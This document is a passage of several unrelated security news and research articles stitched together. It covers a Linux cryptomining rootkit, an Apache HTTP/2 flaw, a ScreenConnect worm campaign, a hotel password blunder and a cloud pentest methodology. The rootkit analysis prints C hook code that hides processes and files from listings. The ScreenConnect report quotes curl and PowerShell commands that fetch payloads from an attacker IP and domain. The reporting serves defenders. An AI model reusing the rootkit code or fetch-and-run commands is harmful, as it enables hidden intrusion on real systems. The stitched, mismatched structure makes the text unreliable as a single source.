The C2 can later send SANSAR a MinerConfigUpdate message with the miner ID and replacement settings. SANSAR changes only the supplied fields.

How the NVML wrapper fakes GPU utilization

NVML is the user-space management library used by nvidia-smi. The collected libnvidia-ml.so.1 wraps that interface. Its hooks call the genuine NVIDIA library, then change selected results before returning them to the caller. NVIDIA's NVML header defines the interface and its structures.

The recovered /opt/vadi_/nvml-hook/ directory contains nvml_hook.c and a Makefile. SANSAR's maintenance task locates this source directory and can run make followed by make install to build and install the wrapper. The Makefile uses ldconfig to locate the NVIDIA library directory and replaces its libnvidia-ml.so.1 with the wrapper. It leaves the genuine versioned library in place for backend calls and creates /usr/lib/.libnvidia-ml.so.1.backup if no backup exists.

The wrapper hooks NVML calls used by monitoring tools such as nvidia-smi. It forwards queries to the genuine NVIDIA library, then alters selected results: GPU utilization is reported as 0%, while temperature and power are replaced with random readings of 36 to 46 degrees Celsius and 100 to 200 watts.

How the acpi_thermal_mgr rootkit conceals cryptomining activity on Linux

acpi_thermal_mgr.ko uses Function Tracer (ftrace) to intercept system calls such as getdents64 for directory listings, openat for file access and kill for signals, along with the kernel routines that produce TCP and UDP socket listings. Its handlers remove matching entries or reject requests involving hidden processes and files.

The collected files included the module's C source, acpi_thermal_mgr.c, under /usr/src/acpi_thermal_mgr-1.0/. The source also contains Turkish comments, including Tüm gizli isimleri kontrol et ("Check all hidden names").

Its module’s parameters control process and file concealment, module self-hiding and the executable paths used by its watchdog.

kurt and lyrebird are compiled into the module as default process names. The remaining process names, filename prefix and client paths start empty, and module self-hiding is disabled by default. These defaults can be overridden through module parameters supplied when the module is loaded.

How the rootkit filters processes and files

The module hides processes whose names match its configuration. It also hides their worker threads, even when those threads use different names.

The getdents and getdents64 hooks rewrite directory records returned by the original syscall. When a program lists /proc, they omit entries for hidden PIDs. In hook_getdents64, a matching first record is removed from the buffer; later matches are skipped by extending the preceding record:

offset = 0; prev = NULL; while (offset < ret) { cur = (void *)kdirent + offset; if (should_hide_dirent(cur->d_name, strlen(cur->d_name))) { if (!prev) { ret -= cur->d_reclen; memmove(cur, (void *)cur + cur->d_reclen, ret - offset); continue; } prev->d_reclen += cur->d_reclen; } else { prev = cur; } offset += cur->d_reclen; } copy_to_user(udirent, kdirent, ret);

Other hooks block direct inspection. open and openat return ENOENT ("No such file or directory") for hidden /proc/<pid> paths. Selected metadata and link queries apply the same path check, while PID queries such as sched_getaffinity return ESRCH ("No such process").

When hide_prefix is set, the directory hooks also omit file and directory names that begin with that prefix. The open and openat hooks reject paths whose final component matches it. The checks in hook_openat are:

fn[PATH_MAX - 1] = '\0'; if (is_proc_path_hidden(fn)) { kfree(fn); return -ENOENT; } bn = strrchr(fn, '/'); bn = bn ? bn + 1 : fn; if (is_file_hidden(bn, strlen(bn))) { kfree(fn); return -ENOENT; } kfree(fn); return orig_openat(regs);

The kill hook also normally returns ESRCH for hidden PIDs. It forwards the request to the original syscall when the caller's name matches hide_name, allowing the configured manager to signal hidden processes:

if (is_pid_hidden(pid)) { /* Sansar (ana süreç) kendi çocuk süreçlerini yönetebilmeli. * Çağıran sürecin comm'u hide_name (sansar) ise kill'e izin ver. */ get_task_comm(caller_comm, current); if (hide_name[0] && strncmp(caller_comm, hide_name, TASK_COMM_LEN) == 0) return orig_kill(regs); return -ESRCH; } return orig_kill(regs);

If hide_module is enabled at load time, initialization removes the module's entry from the kernel module list and its sysfs object.

Netns: the backdoor that resolves its C2 from Ethereum

To locate its controller, netns sends eth_call requests over HTTPS through public Ethereum RPC services to the embedded contract 0x43eb291f56688c63c93e8a93c4591fc997cf6349, using selector 0x6ded96e7. The response is expected to contain an encoded IPv4 address. netns decodes it and attempts a plain TCP connection to that address on port 8080.

Once netns connects to the controller on port 8080, the controller can send a text command in the form SHELL <host> <port>. netns parses the destination, forks a child process and starts Bash, which opens a separate outbound connection to the supplied host and port. That destination can differ from the controller address retrieved from Ethereum. The command loop has no application authentication or integrity check.

Conclusion: What this means for GPU and AI infrastructure

SANSAR manages CPU and GPU miners over Tor. The kernel rootkit hides selected processes and socket entries, while the NVML wrapper falsifies GPU readings.

The separate netns backdoor provides shell access and retrieves its controller address from Ethereum. We documented similar blockchain-based C2 discovery in our 2026 PHANTOMPULSE research.

Organizations expanding GPU infrastructure for AI and LLM workloads should check who can submit jobs and whether GPU monitoring libraries have been modified, as cryptojacking can divert compute capacity from legitimate workloads and increase operating costs.

Organizations “can’t patch their way out of AI” and should instead focus on mitigation post exploitation, according to Dick O’Brien, principal intelligence analyst at Symantec.

Speaking at the IRISSCON 2026 conference in Dublin, Ireland, on November 11, he highlighted the rapid closure of the patch window in the past year due to attackers’ use of AI.

This includes AI tools to discover zero day flaws and the ability of frontier models to chain together low severity vulnerabilities together to find an exploit path in a way that humans would not be able to do.

The Zero Day Clock, a live dashboard that tracks the collapse of the time-to-exploit (TTE) window from CVE disclosure to confirmed exploitation in the wild, has estimated that the average time to exploitation following public disclosure of a vulnerability fell from one week in 2025 to one day in 2026. The initiative estimates that in 2027, the average time will be a minute.

“Once you get to a minute, what can you do realistically? We need to start thinking beyond patching to address vulnerabilities,” O’Brien said.

This shift was demonstrated by the speed at which attackers exploited the recent PHP2Shell vulnerability following its disclosure in October 2026. O’Brien noted that the first reporting exploitation attempts occurred just 19 minutes after the bug was made public.

Amazon also reported that it detected an attempted exploitation attempt of PHP2Shell four days before the vulnerabilities were published.

Agentic AI Orchestration of Attacks

Post-initial access, O’Brien expects threat actors to move to an era of “end-to-end agentic orchestration of attacks” in the next year, shifting away from using AI as an assistant for various tasks towards AI agents undertaking attacks independently.

This will make it significantly harder for defenders to detect and respond to threats in their organization’s environments.

There have been a few examples of this approach taking place so far. One of these was an attack on the Dutch Institute of Vulnerability Disclosure (DIVD) in September 2026, where AI agents executed the post-compromise tasks independently, operating at machine speed.

According to an analysis by Symantec of the DIVD’s assessment report, it took 19 minutes for the attack to be detected, but 19 hours before the response began, and a further nine hours to contain the threat.

“This is what we’re dealing with. It’s an excess of 24 hours and you know you’re not going to be able to compete with something operating at machine speed,” O’Brien commented.

Adopt an Assume Exploit Mindset

In this landscape, organizations should assume exploitation is inevitable and prepare for machine-speed post-compromise activity, where attackers can move from initial access to impact in minutes rather than days.

“Stop measuring your mean time to patch and start measuring your mean time to mitigate. Assume an exploit is going to happen and the plan your preparedness for that,” O’Brien advised.

He set out a number of mitigation tasks security teams can immediately focus on:

Behavior blocking

Default-deny for what runs

Least privilege for every agent and token

Inspect data before it leaves the device

Bind every agent action to a named human

“These are all things you can start doing right now before you become aware of a vulnerability,” O’Brien added.

Longer-term, organizations must integrate detection and protection technologies on multiple different control points, which are able to identify behavioral anomalies of rogue or malicious AI agents.

A critical flaw in Apache HTTP Server's HTTP/2 module, mod_http2, can let a remote attacker run code on the server. Tracked as CVE-2026-119618, it affects versions 2.4.55 through 2.4.70 and is fixed in version 2.4.71, released yesterday.

Only servers with HTTP/2 enabled are affected, according to Red Hat, which ships the server as part of Red Hat Enterprise Linux.

An attacker who can reach the server needs no authentication to exploit the flaw and could take full control of the server process, the Linux vendor says. It rates the flaw 9.8 out of 10 on the CVSS scale.

The vendor's assessment, published yesterday, also says "public research has demonstrated a reliable exploit" against a server in its default configuration with mod_http2 enabled. It does not name or link that research. Security company Wiz said later that day that no exploit was available and that no exploitation in the wild had been reported.

HTTP/2 runs only where the Protocols directive turns it on, as the module documentation explains. The directive uses h2 for HTTP/2 over TLS and h2c for HTTP/2 over plain TCP. It can be set for the whole server or for a single virtual host, so admins should check the server-wide setting and every virtual host.

Standalone builds of the module, released on GitHub as mod_h2, are affected from version 2.0.8 through 2.0.42.

Admins who run the Apache HTTP Server project's own releases should move to version 2.4.71, the fixed release named in its security advisory. That release also fixes a crash in mod_md, rated important, and a one-byte overwrite of stack memory in mod_vhost_alias, rated low.

The distributions in the table below ship their own builds of the server, with their own package version numbers. On Red Hat Enterprise Linux 9, for example, the fix ships as mod_http2-2.0.26-7.el9_9.1.

Red Hat shipped fixes for Red Hat Enterprise Linux 9 and 10 yesterday and rates the flaw Important on those releases rather than Critical. Their mod_http2 packages give each HTTP/2 stream its own memory allocator, which makes an attack much harder, according to the vendor's severity assessment. Red Hat Enterprise Linux 8 and earlier do not contain the vulnerable code.

The Apache HTTP Server advisory offers no workaround. In its vulnerability analysis, Wiz advises admins who cannot update yet to remove h2 and h2c from the Protocols directive, leaving Protocols http/1.1.

The standalone mod_h2 project has published no fixed release so far. Its release list on GitHub ends at 2.0.42, the last affected version, and its repository has been read-only since it was archived on June 9. The Protocols change above also applies to servers that use those builds.

The flaw was reported on October 26 by Anthropic's OSS Scanner, a free scanning service for open-source projects that uses the company's AI models. Anthony Weems and Simon Scannell of Google Cloud Vulnerability Research reported it last week.

An earlier HTTP/2 flaw, CVE-2026-23918, was fixed in version 2.4.67, released on May 4. Servers updated to that release, or to any later one up to 2.4.70, still run a version that the new flaw affects.

A threat actor has compromised hundreds of endpoints across dozens of ConnectWise ScreenConnect customers in a fresh campaign, cybersecurity outfit Huntress reports.

The attacks were observed on November 11, when the hackers abused their unauthorized access to cloud-hosted ScreenConnect panels to run commands on managed endpoints.

According to Huntress, the campaign compromised at least 6 MSPs and 288 hosts across 48 organizations. The attackers hit all 288 compromised hosts within 90 minutes.

The attackers’ commands deployed rogue ScreenConnect clients and a malware toolkit called SCKit that provides persistent backdoor access, intercepts session cookies, and can self-replicate.

Initially deployed via ScreenConnect panels, it waits for a technician to connect to the compromised endpoint to infect their workstation. Next, attempts to compromise other sessions the technician has access to and spread itself to other panels.

“However, not all functionality has been observed during observed incidents; some functionality has been discovered through analyzing the payloads,” Huntress says.

Advertisement. Scroll to continue reading.

As part of the attacks, the hackers exploited a vulnerability in RMM+, a third-party extension for managing ScreenConnect sessions that uses a shared access key to bypass ScreenConnect’s authentication mechanism.

The hackers likely exploited a bug in the extension’s versions 1.0.31 and 1.0.32, where the access key defaults to blank if not configured, thus allowing an attacker to bypass authentication with an empty value.

“Our analysis suggests that most RMM+ installations we encountered were legitimate, usually added for a project and left in place. But versions 1.0.31 and 1.0.32 contained a serious authentication flaw: if an administrator had never configured the extension’s access key, RMM+ would accept a blank one,” Huntress says.

The cybersecurity firm says its investigation determined that commands reached endpoints within minutes. However, there was no corresponding login activity, and the reviewed logs were linked to RMM+ instead.

In response, ConnectWise disabled five extensions from the RMM+ family across approximately 400 ScreenConnect environments, including Labtech Plus, RMM Plus, RMM+, RMM Plus Password Link, and RMM+ Password Link.

“Their presence alone does not establish compromise. These extensions provide an API capable of executing remote commands. Access to that API is protected by a passphrase configured by the partner during setup,” ConnectWise notes.

Both Huntress and ConnectWise have released indicators of compromise (IoCs) associated with the campaign and recommend that organizations disable the extensions in their on-premises ScreenConnect deployments.

d08ad8e7d77f.text: Welcome, once again, to PWNED, where all the victims are self-owned. This week, we welcome you to a London hotel where you could check out its admin credentials for a booking website just by walking past the front desk. Our story comes courtesy of Neycho Tepavicharov, co-founder of Flashcloud, a Delaware-based web hosting company. He was staying at a hotel in London when he noticed a shocking breach of basic security protocols by management, who were a little too hospitable with their credentials. As he was passing through the lobby, Tepavicharov noticed that the door behind the front desk was open and, inside that back room, there was a whiteboard. On the whiteboard, written in plain English, were the hotel’s Booking.com administrative username and password. Anyone near the desk could clearly see the login information, and if they didn’t have time to write it down, they could have snapped a picture for later use. As Tepavicharov explains, there’s plenty of mischief you could perform with these credentials. “With that login, someone could change or cancel reservations, see guests’ names and contact details, or message guests pretending to be the hotel,” he said. “Fake 'please confirm your payment' messages sent from compromised hotel accounts are a well-known scam.” An attacker could potentially exploit that access to disrupt hotel operations or target guests with convincing scams. Whether the exposed credentials alone would have been enough to access the account would depend on its security settings. Tepavicharov decided to play the role of good samaritan and warn the hotel’s manager that the business was endangering itself by showing everyone its password. “I asked to speak with the manager and showed him what I’d seen. He was mortified and very grateful,” Tepavicharov said. “Nobody on staff had thought of it as a risk. It was just the easiest way for the whole team to share one login.” After Tepavicharov talked to the manager, not only did the hotel change its ways, but it also moved its website to his hosting service, Flashcloud. Tepavicharov notes that there are plenty of takeaways from this incident. Most important: give each user dedicated credentials with their own separate login, and use multi-factor authentication. “The lesson is an old one, but it keeps happening,” he said. “Shared logins end up written somewhere convenient. Give each staff member their own login, turn on two-factor authentication, and keep passwords in a password manager, not on the wall.” ®

ConnectWise has taken the precautionary step of disabling five third-party extensions in partner environments following reports of unauthorized access.

In an advisory posted on its site, the company said there is no evidence that the incident involves a compromise of its infrastructure or a vulnerability in the ScreenConnect software.

"Our initial assessment suggests the activity may involve a threat actor's abuse of independent third-party extensions installed in partner environments," it said. "We are continuing to validate this assessment. The initial access method and full scope remain under investigation."

ConnectWise has identified about 400 partner environments with at least one of the third-party extensions installed. It also emphasized that the presence of the extensions alone does not indicate or establish compromise.

While these extensions provide an API capable of executing remote commands, access to that API is secured by a passphrase configured by the partner during setup, it added. The list of extensions identified for precautionary disabling is below -

Labtech Plus

RMM Plus

RMM+

RMM Plus Password Link

RMM+ Password Link

ConnectWise also said it has urged on-premises partners to disable the extensions, and is recommending all partners to ensure security controls are running, preserve suspicious activity logs, and stay vigilant for -

Unusual sign-ins, unfamiliar locations, repeated login failures, and unexpected multi-factor authentication (MFA) prompts

New administrator accounts or changes to user permissions

Unexpected extension installations, remote commands, and Toolbox activity

Unapproved remote-access software on customer devices and technician workstations

Unexpected support requests, password-reset messages, and software downloads through a trusted channel

Cybersecurity company Huntress, which is also tracking the activity, said it has observed attackers using access to cloud-hosted ScreenConnect panels to push Run commands with an aim to install rogue ScreenConnect clients on at least 288 managed endpoints across 48 organizations. The activity was first detected on November 11, 2026, at around 5:47 p.m. UTC.

Huntress told The Hacker News that it has not seen evidence of a new vulnerability, but noted the exact method through which the attacker got panel access remains unclear. Current telemetry points to compromised credentials or hijacked operator sessions to gain initial access, it said.

The overall attack unfolds in a worm-like fashion using a two-step process -

Initial access: Attackers use a compromised ScreenConnect panel's Run Command feature to deploy a rogue ScreenClient client across endpoints, creating a persistent backdoor that no longer depends on the original panel.

Lateral movement: When a technician connects to an infected endpoint through ScreenConnect, the malware can spread back to their workstation, steal saved browser sessions and authentication tokens, and pivot to other ScreenConnect panels the technician has access to.

"The rogue clients deliver SCKit, a custom malicious toolkit that establishes persistent remote access and creates a relay trap for intercepting session cookies," Huntress researchers Ben Nahorney and Susannah Matt said.

"The infection path works in two stages: from an infected endpoint to a technician who connects to it, and from a technician's workstation to every endpoint their panel can connect to. However, not all functionality has been observed during observed incidents; some functionality has been discovered through analysing the payloads."

SCKit is delivered as an encrypted payload and via a Base64-encoded dropper ("sckit-run.bat"), which then contacts a remote server to fetch a PowerShell payload ("sckit-decoder.ps1") that's responsible for launching the toolkit.

Other components of the malware are designed to add Microsoft Defender exclusions, install a second attacker-controlled ScreenConnect client, create a scheduled task named "TrapWatch," and replace the legitimate ScreenConnect installation with an attacker-controlled copy.

There are signs that at least one of the scripts is generated by a large language model (LLM) based on the detailed source code references and comments that explain its functionality.

"Going beyond what we've observed, we've reconstructed an additional functionality intended to spread from a technician's workstation to the ScreenConnect panel," Huntress said. "This has been discovered from analysis of its scripts, configuration, and tools. To date we have not observed a successful jump from an infected endpoint to a technician workstation, or from that workstation to other endpoints."

This involves abusing the connection to fetch a dropper ("Run-Lateral-Full.bat"), which then connects to an external server ("ns.mo7sen[.]dev") to download a loader that gathers the workstation's unique ID, sends it back to the attacker, and returns a tailored encrypted kit for that specific workstation -

"Panel-Lateral.ps1," which in conjunction with "LabConfig.ps1," steals the .aspxauth session cookie from the workstation and attempts to replay the cookie against the panel and get the tokens necessary to enumerate any other sessions the technician can access.

"ToolboxRelayUploader.exe," which leverages access gained to any other sessions to upload a payload, "WithUninstall.ps1," to the panel's Shared Toolbox.

"A panel request tells every reachable session to run the toolbox item," Huntress said. "This payload is designed to run as SYSTEM on those endpoints, installing the trap and extending the cycle. Roughly 60 seconds after the broadcast, ToolboxRelayUploader.exe deletes the Shared Toolbox item."

To add to the concern, the threat actor has been observed tagging each compromised managed service provider (MSP) with a sequential number. Huntress said the tags it has observed start partway through the sequence, indicating other MSPs may have been compromised earlier. ScreenConnect users are advised to check their Run Command history even if they haven't received alerts.

In a separate alert, Sophos said it has also observed unauthorized ScreenConnect client deployments following the same modus operandi. The activity has originated from three ScreenConnect instance IDs -

d905b2b1b165d0a9

4b8f4089ddaac6a9

df1f7ef0cfacd0d8

It's suspected that these are compromised instances that are being used to execute commands and deploy additional malicious instances, whose IDs are below -

2588ef5c15954b10

ed630cc2c873b091

"Curl.exe downloaded ScreenConnect.ClientSetup.msi from 185.99.255[.]28 to C:\Windows\TEMP\sc.msi," Sophos explained. "A ScreenConnect-generated command file then launched msiexec.exe to install the client silently. The researchers also observed ScreenConnect scripts staging batch files and using PowerShell with execution-policy bypass to retrieve a second-stage script from ns[.]mo7sen[.]dev/EadF.php?p=4."

(This is a developing story. Please check back for more details.)

6e8de2022b7f.text:
Users trust a cloud provider to configure and maintain their IT services, including data storage. In turn, the provider guarantees that hosted services will stay up and that data will remain strictly confidential.

To demonstrate that their platforms are secure, providers choose different strategies: some run bug bounty programs, some rely on regular internal audits, and some bring in external research teams. However, cloud pentest methodology still has plenty of blind spots: there’s no single standard, and the outcome depends on the experience and skill of the team.

Most pentests in this area have historically focused on the external layer: the management console, customer interfaces, APIs, and the basic network perimeter. This layer is important, but it’s only the surface.

In this introductory article, we share our approach to penetration testing of cloud environments, which we’ve developed over several years and dozens of projects. We don’t claim to cover every possible scenario. Instead, we want to show the reasoning behind our pentests and highlight less obvious points that are easy to miss.

Key points

Cloud infrastructure is more complex than a traditional web application. To simplify, you can think of it as a hotel with three zones: the booking website (External, the outermost layer), the guest rooms (Overlay, the logical layer), and the staff area (Underlay, the infrastructure or base layer). A cloud service is well protected if the trust boundaries between these zones cannot be breached.

A cloud pentest’s value isn’t measured by the number of vulnerabilities found or by the mere fact that code ran. Remote command execution in an isolated tenant container is only the beginning of a pentest, not the end. The main goal is to assess whether an attacker can violate trust boundaries.

The assessment should answer five critical questions: Can an attacker read, modify, or delete other tenants’ data? Can they take over the provider’s IAM service account? Does compromising a runtime environment lead to the attack spreading to other resources and services? Can the provider’s internal resources be affected from low-trust segments? Is a virtual environment escape possible?

A negative result is still a result. If a pentester cannot move from the tenant plane to the provider overlay, that is a valuable finding. It shows which protection boundaries work in practice and which rely only on assumptions and need additional controls. However, it does not prove that the trust boundary is impossible to cross or that no other attack paths exist.

Key terms

Below, we explain some specific terms that are most often used in cloud infrastructures.

Show definitions

Tenant (think of a renter in an apartment building) is a logically isolated unit within a cloud platform. Examples include a user (such as an organization), a separate project or cloud account, or another unit of administrative and resource isolation.

Tenant plane is the set of IT services and data that a tenant manages directly: virtual machines, Kubernetes clusters, databases, object storage, and managed applications.

Management console is the graphical web interface and the entry point for the customer at the External layer.

Service runtime is the actual environment in which a provider’s cloud product runs: a process, container, pod, virtual machine, or microVM.

Service management plane consists of the provider’s internal components that create, update, restart, back up, and delete the service runtime.

IAM service account (service identity) is a special digital identity for programs, bots, cloud services, or servers. It lets them access the required cloud resources automatically and securely, without human involvement.

Context (in cloud security) is the set of attributes and credentials that define the current permissions and runtime environment of a subject in the system. It includes the identity in use (for example, a service account token, certificate, or key), the privilege level (roles and IAM policies), and the technical environment from which the request is initiated (container, virtual machine, or network segment).

Initial zone is the context in which the researcher lands right after the first successful transition. It consists of the specific runtime, IAM service account (service identity), namespace, network routes, and the set of available services.

Provider overlay is the provider’s internal environment, hidden from the customer, that is accessible from the initial zone: network segments, DNS zones, internal APIs, and management components.

Control plane consists of the platform components that make global management decisions and change the platform state: they allocate resources, assign permissions, configure the network, and coordinate state.

Data plane consists of the components that transfer or process user data and application traffic. Some components (or systems) sit at the intersection of different architectural layers, so they can’t automatically be assigned to the data plane or the control plane. Examples include logging, backup and billing systems. Their role changes depending on the task a component is performing at a given moment and how its work affects user traffic.

Cell is a bounded portion of the platform in which compute, disk, network, or management components are shared (often tied to a region, availability zone, service type, or group of tenants).

Pods are the smallest compute units in Kubernetes. A pod is one or more containers that are deployed on the same host and share common resources.

Cross-tenant impact is confirmed impact from the context of one tenant on the resources of another, without a trust relationship defined by the architecture.

Provider-level impact is impact on a provider’s management, infrastructure, or supply chain component that goes beyond the original tenant resource.

Tenant workload is the set of compute resources, processes, and applications that a customer runs and uses in their tenant to perform business tasks. It includes virtual machines, containers (such as pods in Kubernetes), serverless functions, managed databases, and any other active services that process tenant data.

What a pentester needs to check

During a project, a pentester needs to examine not only the management console but also the boundaries that separate the tenant plane from managed services and the provider’s internal infrastructure. A single request passes through many components, from the API gateway to the storage system. A configuration error in any of them changes the attack context: the researcher takes over an IAM service account, gains access to the cloud’s internal network, or acquires the ability to affect another tenant.

This is why a cloud pentest is not just a search for vulnerabilities in the management console, nor a sequential scan of cloud subnets. Above all, it means testing trust boundaries: verifying how transitions between zones with different trust levels are controlled. A more trusted zone must treat everything that comes from a less trusted zone as potentially hostile.

What makes a boundary real? Controls such as authentication and authorization (IAM, RBAC), isolation (virtualization, containerization, network segmentation), cryptography (mTLS), input handling, and others. We build a map of potential boundaries and check each one: is it actually enforced by controls, or does it rely on assumptions (architectural, infrastructural, implementation-related, and others)?

Cloud platform as a research target

When we assess the security of a traditional system, we usually start from basic architectural patterns. For web applications, this is a typical stack of a web server (Nginx, Apache, and so on), server-side logic, object storage, and integrations with third-party services. For hardware solutions, it is a chain from physical interfaces to firmware and protocol handlers.

Cloud platforms are different: how they’re actually built is highly uncertain. Cloud computing standards and reference architectures (such as NIST SP 800-145 and ISO/IEC 17788) define the roles of participants and the relationships between cloud components, but they don’t prescribe strict rules for how to build a platform.

Because there is no single technical standard, a managed database that looks the same from the outside can run in an isolated virtual machine at one provider, in a namespace of a shared Kubernetes cluster at another, and in a dedicated tenant cluster at a third. The same variability applies to software choices. A provider can use OpenStack, Kubernetes, its own control plane, or a combination of them. This means a familiar product name doesn’t give a full picture of the system’s internal structure.

That’s why a cloud pentest is harder than assessing a traditional system. Once the tenant trust boundary is breached (say, by escaping from a microVM to the host operating system), the job is no longer finding the next open port. It becomes reconstructing the architecture from indirect clues. The pentester puts the puzzle together by studying running processes, network routes, certificates, service names, and agent configurations. From these details, the researcher determines the role of each component and the trust boundaries between them.

To keep our approach vendor-agnostic, we will look at cloud infrastructure without reference to specific brands. Depending on the architectural scenario, the same component can be implemented in fundamentally different ways. For example, in one case a managed database can run as a separate managed service isolated at the virtual machine level (where the main risks are hypervisor security and the management API). In another case, it can run as a container inside a shared Kubernetes cluster (where the threat comes from the possibility of container-to-host escape and the quality of namespace isolation).

The hotel analogy and the three cloud layers

There is no single standard for building cloud infrastructure. To make pentesting systematic, we use our own three-layer model of the cloud: External, Overlay, and Underlay. The easiest way to picture a cloud platform is as a large hotel. It has a public area for guests, back-of-house areas for staff, and technical floors with utility systems. This analogy doesn’t cover every detail, but it shows well how areas of responsibility are divided and how the transitions between them work.

External layer: in a hotel, this is the booking website, the doors, and the front desk. At this layer, the pentester interacts with cloud components the way a typical user does: logs in to an account, calls the public API, creates IT services, and connects to their endpoints. Work at this layer is similar to external penetration testing or application security assessment. The main goal is to gain initial access from the outside to another customer’s tenant, or to move to the Overlay layer.

The External layer is where tenant access is provided as intended. In a hotel, the tenant is the room itself: guests control the belongings and equipment in their own room, but their key card must not open neighboring rooms. In the cloud, customers manage only their own data, virtual machines, pods, databases, object storage (S3 buckets), and accounts within their own project. A tenant is not a separate infrastructure layer. It is what the user gets at the External layer. This is where the user’s legitimate privileges end and the first trust boundary, the one the pentester checks, begins.

The provider’s service layer (Overlay): in a hotel, this is the “Staff only” area: kitchens, laundries, the control room, service corridors, and the master key system. In cloud infrastructure, this is the internal logical service management layer: runtime environments for managed services, schedulers, backup, monitoring (observability) and billing systems, the IAM system, and internal APIs. Customers use the results provided by these systems but must not get any access to them unwarranted by the architecture.

Don’t confuse this term with an overlay network in traditional network engineering: a logical network on top of a transport underlay network, such as VXLAN segments. In our methodology, Overlay has a broader meaning: it’s the internal logical layer for running and managing cloud services, and it can be split differently depending on the cloud. For clarity, the table below divides it into two sublayers: runtime environments of tenant services and provider’s internal components.

Infrastructure layer (Underlay): in a hotel, this is the utilities, electrical equipment, and physical access control systems that keep the building running. In the cloud, this is the hardware layer: physical servers, host operating systems, hypervisors, the transport network, storage systems, and out-of-band management. Careless testing at this layer can do serious damage.

But the key point of this analogy is not the rooms themselves, but the doors between them. A vulnerability on a booking website is dangerous, but a master key left in a room that opens several or every door in the building is far more so. The same rule applies in the cloud: remote code execution (RCE) inside an isolated tenant container (pod) is only a local problem. Compromise of an IAM service account that manages the resources of a region affects the entire platform.

The table below gives examples of components, pentester entry points, and assessment goals for each layer. We split the Overlay into two sublayers because the runtime environment of a tenant service and the provider’s internal infrastructure have different trust boundaries and different entry points.

Layer

What it contains

Typical pentester entry point

Main assessment goal

External

Public cloud interface (API), management console, IAM, endpoints for interacting with IT services, and SDK.

The internet or a regular customer account.

Gain initial access to the tenant, execute code, compromise an IAM service account (service identity).

Overlay (IT services)

Service runtime: the operating system and its components, provider and product agents, and database engine.

User SQL queries, code executed inside jobs, imported plug-ins, or operating system images.

Break out of the service runtime, find excessive privileges on the IAM service account (service identity) assigned to it.

Overlay (provider components)

Billing system, backups, monitoring, access control system, and internal cloud API.

A confirmed initial zone obtained at the previous step or provided by the cloud provider to save time.

Breach the boundaries between services, disrupt tenant isolation, find ways to interact with the control plane or IT services.

Underlay

Host operating systems, virtualization systems (hypervisors), the transport network, storage systems, baseboard management controllers (BMC), and other low-level mechanisms.

A virtual machine the pentester controls, with access to the underlay, or a privileged IAM service account (service identity).

Check the isolation of virtualization and neighboring workloads, as well as the real scale of the impact.

A real cloud platform doesn’t always fit this matrix. A service can run in a separate virtual machine, in a pod in a shared cluster, or in a microVM. A hypervisor belongs to the Underlay, but its management API may be reachable from the Overlay. That’s why the layer a pentester is currently on (External, Overlay, or Underlay) depends not just on the IP address but on four attributes taken together:

Who controls the cloud infrastructure component.

Whose data and resources the component serves.

Which IAM service account is used for interaction.

How far its privileges extend.

Where the trust boundaries lie

When analyzing the network that supports a cloud’s internal infrastructure, it’s easy to wrongly assume there is only one trust boundary, between the tenant and the provider. But reaching the provider’s internal network may be only the first step. A real platform contains many zones with different trust levels, and compromising one component doesn’t necessarily give access to the whole infrastructure. For example, a user request may pass in sequence through the customer interface (the management console), then the tenant plane (a database), then the service runtime (the virtual machine that the database runs on), then the service management plane (an internal service that monitors database health), then the cloud control plane (an internal service that manages database resources). Only after that does it finally reach the infrastructure layer.

Each transition changes the trust zone, but it doesn’t necessarily mean reaching a new subnet or obtaining root privileges. It’s like passing through turnstiles inside the same building. We haven’t left the building (a new subnet) or gotten keys to every door (root privileges), but at each checkpoint we have our badge checked again, because different security rules apply on the other side. Sometimes the boundary lies between two roles in the same process, sometimes between an API and a worker, and sometimes between a guest virtual machine and a hypervisor. At the boundary between an API and a worker, a vulnerability can arise from differences in data handling. For example, an internal cloud API accepts a string containing a null byte (\x00) from a user, considers it valid, and passes it on. A background worker then blindly trusts this data and inserts it into a low-level query to a PostgreSQL database. In C libraries, \x00 terminates a string. As a result, the database handler truncates the text at the point where this byte was injected. This breaks the logic of the SQL query or permission check and resets the regular user’s context. The system is then forced to change the password of the main administrator (postgres), which leads to full database takeover.

Example 1. Strict isolation (managed database)

A customer rents a managed database in their tenant. The tenant is allowed to run SQL queries but not allowed to connect to the operating system the database runs on. Here, the trust boundary lies between the permissions of a database role and the runtime environment of the database process. If, through the permitted SQL queries, the pentester manages to reach code execution at the operating system level as the service process, the pentester gains full access to the host’s resources. This lets them do more than just collect information. They can actively interact with the host: read and modify files, analyze running processes, establish network connections to internal services, and extract credentials (for example, an IAM service account token) to attack other cloud components.

Example 2. Legitimate access (managed virtual machine)

In another implementation, the provider supports SSH key authentication by design, and the user connects to the resource like to any other virtual machine. Formally, the product is still called a “managed database”, but the actual trust boundary shifts deeper, to the level where the guest OS interacts with the host infrastructure. In this case, SSH access to the operating system is not a violation in itself, because the service model allows it. What we need to test is the next boundary, the one between the service virtual machine and the management agents, metadata, host, or control plane.

This leads to several practical rules:

Normal execution of user code does not, by itself, prove an isolation breach. In IT services such as interactive notebooks, continuous integration (CI) runners, or serverless systems, code execution is a product feature.

Gaining maximum privileges inside a pod does not mean gaining maximum privileges on the node. After crossing each trust boundary (for example, into a zone with different privileges or service accounts), you need to re-check what’s visible: processes, mount points, interfaces, devices, and IAM service accounts.

An IAM service account token that a researcher finds is not necessarily useful. What matters is who issued it and which systems accept it. The tenant or service the token is bound to, and the actions it permits there, also matter.

The fact that a tenant container can reach a provider’s internal IP address does not mean a compromise has occurred. In many clouds, some internal services are reachable over the network by design. For a real compromise, an attacker must either steal a service token or find an internal service that mistakenly accepts customer accounts or requires no authentication.

Remote code execution inside the environment where a service runs does not mean access to the control plane. This is only the initial zone, from which the researcher must look for the next trust boundary: service tokens, the provider’s internal APIs, and neighboring containers.

To tell a real trust boundary violation from a false positive, we use four sequential stages from the researcher’s perspective:

Network visibility. The researcher can see the provider’s internal service from the tenant plane. This is not a breach yet, but it is the first sign that isolation may be insufficient.

The researcher manages to authenticate to a service by presenting a token or certificate compromised at the previous step (for example, a service account token or a metadata token). This is serious, because the service treats the request as legitimate.

The target object grants specific permissions to the current context. This is not yet the execution of dangerous operations, but only a check that they are allowed.

Controlled action beyond the original trust boundary. The researcher performs the minimum safe action that confirms the previously obtained permissions work in practice. For example, they create a test record in a neighboring tenant (usually a second test tenant).

